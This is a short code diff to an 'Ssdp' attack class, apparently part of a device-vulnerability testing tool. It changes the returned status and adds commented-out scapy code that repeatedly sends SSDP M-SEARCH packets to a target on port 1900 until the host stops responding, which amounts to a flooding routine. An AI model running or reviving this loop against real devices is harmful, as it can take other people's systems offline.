@@ -25,7 +25,25 @@ class Ssdp(GenericAttack):
 
         openPorts = self.device["vulnerable_ports"]["udp"]["open"]
         if 1900 in openPorts:
-            return {"status": "vulnerable to ssdp"}
+            return {"status": "vulnerable"}
+            # SSDP_ADDR = target
+            # SSDP_PORT = 1900
+            # SSDP_MX = 1
+            # SSDP_ST = "ssdp:all"
+            #
+            # payload = "M-SEARCH * HTTP/1.1\r\n" + \
+            #           "HOST: %s:%d\r\n" % (SSDP_ADDR, SSDP_PORT) + \
+            #           "MAN: \"ssdp:discover\"\r\n" + \
+            #           "MX: %d\r\n" % (SSDP_MX,) + \
+            #           "ST: %s\r\n" % (SSDP_ST,) + "\r\n";
+            # spoofed_packet = IP(dst=target) / UDP(sport=5001, dport=1900) / payload
+            # while self.running:
+            #     send(spoofed_packet)
+            #     time.sleep(2)
+            #
+            #     if not self.is_alive():
+            #         log.info('Host not responding!')
+            #         return {"status": "not_responding"}
 
         return {"status": "no_open_ports"}
 
